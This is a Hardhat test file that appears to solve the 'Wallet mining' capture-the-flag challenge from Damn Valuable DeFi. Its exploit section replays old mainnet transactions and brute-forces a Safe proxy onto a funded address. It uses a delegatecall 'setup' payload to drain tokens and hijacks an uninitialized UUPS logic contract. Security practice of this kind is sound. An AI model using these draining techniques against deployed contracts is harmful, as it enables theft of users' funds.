const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { keccak256 } = require('ethers/lib/utils');

// Taken from https://docs.ethers.org/v5/cookbook/transactions/
function getRawTransaction(tx) {
    
    const unsignedTx = {
        to: tx.to,
        nonce: tx.nonce,
        gasLimit: tx.gasLimit,
        gasPrice: tx.gasPrice,
        data: tx.data,
        value: tx.value,
        chainId: tx.chainId
    };

    const signature = {
        v: tx.v,
        r: tx.r,
        s: tx.s
    }

    return ethers.utils.serializeTransaction(unsignedTx, signature);
  }

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;
    
    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, ward, player ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [ [ ward.address ], [ DEPOSIT_ADDRESS ] ], // initialization data
            { kind: 'uups', initializer: 'init' }
        );
        
        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);
        
        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        ethers.utils.Logger.setLogLevel(ethers.utils.Logger.levels.DEBUG);

        // Addresses on-chain related to the txs below
        factoryAndCopyOwner = '0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A';
        factoryAddr = '0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B';
        copyAddr = '0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F';

        // Simulate sending 0.1 ETH to accounts that are doing deployment
        // If contract doesn't have a payable function, use selfDestruct for now
        setBalance(factoryAndCopyOwner, 1n * 10n ** 17n);

        // The transactions need to be old enough to avoid the EIP-155 check aka chain-id on tx
        // They also need to be replicated in order, so that they increase the nonce correctly on the local chain
        // The tx were found using etherscan's advanced filtering
        copyTxNonce0Id = "0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3";
        randomTxNonce1Id = "0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4";
        factTxReplayNonce2Id = "0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261";

        copyTxNonce0 = getRawTransaction(await ethers.getDefaultProvider().getTransaction(copyTxNonce0Id));
        randomTxNonce1 = getRawTransaction(await ethers.getDefaultProvider().getTransaction(randomTxNonce1Id));
        factTxReplayNonce2 = getRawTransaction(await ethers.getDefaultProvider().getTransaction(factTxReplayNonce2Id))
        await ethers.provider.sendTransaction(copyTxNonce0);
        await ethers.provider.sendTransaction(randomTxNonce1);
        await ethers.provider.sendTransaction(factTxReplayNonce2);

        // Plan 1: we plant a backdoor inside the address we bruteforce (hence the mining in wallet-mining), which is a proxy of masterCopy, using setupModule() and 
        //  redirecting it to our exploit contract using a delegate call, there we can transfer the token funds.

        Exploit = await (await ethers.getContractFactory('ExploitWalletMining', player)).deploy(walletDeployer.address, authorizer.address, token.address, player.address)

        const factoryABI = ["event ProxyCreation(Proxy proxy)",
                     "function createProxy(address masterCopy, bytes memory data) public returns (Proxy proxy)",
                     ];
        const factory = new ethers.Contract(factoryAddr, factoryABI, player);
        const filter = [ethers.utils.id("event ProxyCreation(address)")];

        let safeABI = ["function setup(\
            address[] calldata _owners,\
            uint256 _threshold,\
            address to,\
            bytes calldata data,\
            address fallbackHandler,\
            address paymentToken,\
            uint256 payment,\
            address payable paymentReceiver\
        ) external"];

        let exploitABI = ["function yoink(address receiver, address _token) external"];

        let ifaceSetup = new ethers.utils.Interface(safeABI);
        let ifaceExploit = new ethers.utils.Interface(exploitABI);
        exploitData = ifaceExploit.encodeFunctionData("yoink", [player.address, token.address]);
        setupData = ifaceSetup.encodeFunctionData("setup", [[player.address], 1, Exploit.address, exploitData,
            ethers.constants.AddressZero, ethers.constants.AddressZero, 0, player.address]);

        for(i=0;i<100;i++) {

            await factory.createProxy(copyAddr, setupData, {gasLimit:1e7});
            cur_addr = "0x" + (await ethers.provider.getLogs(filter))[0].data.slice(26);

            if(cur_addr == DEPOSIT_ADDRESS) {

                console.log("bruteforced address: " + cur_addr);
                break;
            }
        }

        //  Note: Due to the use of return(0,0) which is equal to stop(), in the can() function, if authorizer.can() is false it will result in "amount of return data" errors
        //  Note: this is an UUPS pattern, to upgrade the contract, we need control of the logic contract. https://eips.ethereum.org/EIPS/eip-1822
        // Plan 2: Regarding the rewards for the wallets, we already recreated the correct starting state with the txs, now we can upgradeTo() the AuthorizerUpgradeable
        //  contract to drain deployerWallet, which contains 43 ethers.
        //  Reading the script, we notice that the logic contract is never initialized, so that's our target. We retrieve it, take ownership and ...

        // WARNING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        // Since the Cancun fork, this challenge is no longer solvable, it relies on the use of selfdestruct whose behaviour has since changed to no longer destroy a contract

        // Standard logic slot
        logicAddress = await ethers.provider.getStorageAt(authorizer.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
        await Exploit.exploit(ethers.utils.hexValue(logicAddress));
        console.log(await token.balanceOf(player.address));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');
        
        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT)); 
    });
});
